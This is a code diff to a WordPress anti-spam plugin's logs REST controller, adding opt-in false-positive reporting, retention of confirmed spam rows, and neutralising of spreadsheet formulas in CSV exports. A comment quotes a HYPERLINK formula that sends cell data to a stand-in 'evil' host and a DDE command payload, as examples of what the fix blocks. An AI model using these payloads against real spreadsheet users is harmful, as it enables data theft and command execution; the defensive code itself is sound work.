@@ -5,10 +5,16 @@ declare(strict_types=1);
 namespace Maspik\Admin\Rest;
 
 use Maspik\Application\CheckFactory;
+use Maspik\Infrastructure\Feedback\FalsePositiveReporter;
 use Maspik\Infrastructure\Logging\LogRepository;
 use Maspik\Infrastructure\Settings\Settings;
 use WP_REST_Request;
 use WP_REST_Response;
+
+if (! defined('ABSPATH')) {
+    exit;
+}
+
 
 /**
  * Logs endpoints. Beyond listing, these power the inbox actions that let a
@@ -26,11 +32,40 @@ final class LogsController
     /** @var CheckFactory */
     private $checkFactory;
 
-    public function __construct(LogRepository $logs, Settings $settings, CheckFactory $checkFactory)
-    {
+    /** @var FalsePositiveReporter */
+    private $reporter;
+
+    public function __construct(
+        LogRepository $logs,
+        Settings $settings,
+        CheckFactory $checkFactory,
+        FalsePositiveReporter $reporter
+    ) {
         $this->logs = $logs;
         $this->settings = $settings;
         $this->checkFactory = $checkFactory;
+        $this->reporter = $reporter;
+    }
+
+    /**
+     * Send the correction upstream, but only for this one row and only because
+     * the owner asked.
+     *
+     * The report carries the stored row, which holds what the visitor wrote, so
+     * it is never a side effect of correcting a verdict - the owner ticks the
+     * box on that correction or nothing leaves the site. Same rule v2 applied.
+     *
+     * @param array<string, mixed> $row
+     * @return array{sent: bool, error: string}|null null when not requested
+     */
+    private function maybeReport(WP_REST_Request $request, array $row, string $action): ?array
+    {
+        $params = (array) $request->get_json_params();
+        if (empty($params['send_report'])) {
+            return null;
+        }
+
+        return $this->reporter->report($row, $action);
     }
 
     public function registerRoutes(): void
@@ -191,10 +226,23 @@ final class LogsController
                 return new WP_REST_Response(['ok' => false, 'reason' => 'invalid_type'], 400);
         }
 
-        // Remove the now-classified row from the passed list.
-        $this->logs->delete((int) $request['id']);
+        $row = $this->logs->find((int) $request['id']);
+        $report = $row === null ? null : $this->maybeReport($request, $row, 'spam');
 
-        return new WP_REST_Response(['ok' => true, 'added' => $added, 'type' => $type, 'value' => $value]);
+        // Kept, not deleted. The row is the evidence the rule was built from,
+        // and the only thing anyone can look at later to judge whether it was
+        // the right rule. It stays in the blocked list, marked as confirmed.
+        $this->logs->markConfirmedSpam((int) $request['id']);
+
+        return new WP_REST_Response(array_filter([
+            'ok' => true,
+            'added' => $added,
+            'type' => $type,
+            'value' => $value,
+            'reported' => $report === null ? null : $report['sent'],
+        ], static function ($v) {
+            return $v !== null;
+        }));
     }
 
     public function delete(WP_REST_Request $request): WP_REST_Response
@@ -269,7 +317,15 @@ final class LogsController
         // exact moment the owner discovered they had been wrongly turned away.
         $this->logs->markNotSpam($id);
 
-        return new WP_REST_Response(['whitelisted' => $whitelisted, 'kept' => true]);
+        $report = $this->maybeReport($request, $row, 'not_spam');
+
+        return new WP_REST_Response(array_filter([
+            'whitelisted' => $whitelisted,
+            'kept' => true,
+            'reported' => $report === null ? null : $report['sent'],
+        ], static function ($v) {
+            return $v !== null;
+        }));
     }
 
     /** Rows per query while building the file, so memory stays flat. */
@@ -347,7 +403,43 @@ final class LogsController
      */
     private static function putRow($handle, array $row): void
     {
-        fputcsv($handle, $row, ',', '"', '');
+        fputcsv($handle, array_map([self::class, 'defuse'], $row), ',', '"', '');
+    }
+
+    /**
+     * Stop a spreadsheet treating a logged value as a formula.
+     *
+     * Every cell in this file is content an attacker chose: they typed it into
+     * a form on the site, it was blocked, and the owner is now exporting it to
+     * look at. Excel, LibreOffice and Sheets read a cell beginning with = + - @
+     * as a formula, so a submission of
+     *
+     *     =HYPERLINK("http://evil/?"&A1,"Click me")
+     *
+     * turns the owner's own log into a link that posts the row beside it to the
+     * attacker, and =cmd|'/c calc'!A1 reaches for DDE. The spam log is the one
+     * export guaranteed to be full of hostile text, which makes it the worst
+     * possible place to leave this open.
+     *
+     * A leading apostrophe is the standard neutraliser: spreadsheets read the
+     * rest as text and do not display it. Tab and carriage return are included
+     * because both are treated as leading whitespace and skipped over, letting
+     * a formula hide one character in.
+     *
+     * The cost is that a genuine "-5" exports as text rather than a number.
+     * Every column here is prose, an address or an id, so nothing is lost that
+     * anyone would total up.
+     *
+     * @param mixed $value
+     */
+    private static function defuse($value): string
+    {
+        $text = (string) $value;
+        if ($text === '') {
+            return $text;
+        }
+
+        return strpos("=+-@\t\r", $text[0]) !== false ? "'" . $text : $text;
     }
 
     /**
